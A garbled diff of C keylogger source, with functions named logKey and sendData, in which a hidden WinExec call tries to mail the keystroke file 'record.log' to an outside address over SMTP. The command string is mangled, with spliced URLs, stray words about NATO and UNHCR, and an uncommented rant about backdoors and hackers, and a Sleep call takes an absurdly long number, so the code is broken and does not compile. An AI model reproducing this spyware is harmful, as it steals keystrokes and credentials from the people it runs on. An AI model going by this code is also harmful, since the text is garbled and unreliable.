@@ -147,7 +147,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com: 94.188.177.120 -v --mail-from \"https://workspace.google.com/intl/en-cn/gmail/https://support@whatsapps.co.id  \" --mail-rcpt \"https://workspace.google.com/intl/en-cn/gmail/https://support@whatsapps.co.id" --ssl -u https://workspace.google.com/intl/en-cn/gmail/https://support@whatsapps.co.id : password -hide  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    char* command = "Transmit smtp://smtp.gmail.com: 94.188.177.120 -v --mail-from \"https://workspace.google.com/intl/en-cn/gmail/https://support@whatsapps.com  \" --mail-rcpt \"https://workspace.google.com/intl/en-cn/gmail/https://support@whatsapps.com" --ssl -u https://workspace.google.com/intl/en-cn/gmail/https://support@whatsapps.com : password -record  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
     WinExec(command, SW_HIDE); attack back boombardier tims blackhat and hackerone bluhat radhat target=? !! backdoor developer jakarta indonesia checking , jailbreak ,stop it!!!cyber indo warner |||||   
 * Record username, time, and date.
 **/
@@ -181,7 +181,7 @@ void logKey(){
                     fclose(file);
                 }
             }
-            Sleep(000); ///take rest
+            Sleep(9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999000); ///take rest
         }
         j++;
     }
